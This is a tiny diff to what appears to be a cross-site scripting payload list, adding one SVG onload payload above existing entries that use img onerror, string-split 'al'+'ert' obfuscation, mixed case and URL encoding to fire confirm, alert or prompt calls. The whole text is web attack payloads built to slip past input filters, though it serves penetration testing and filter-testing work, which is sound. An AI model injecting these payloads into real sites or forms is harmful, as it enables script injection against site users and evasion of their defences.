@@ -1,3 +1,4 @@
+<Svg Only=1 OnLoad=confirm (document.domain)>
 <Img src=OnXSS OnError=confirm(1337)>
 <svg/onload=window["al"+"ert"]`1337'>
 %23%27%2Aprompt%281%29%2A%27
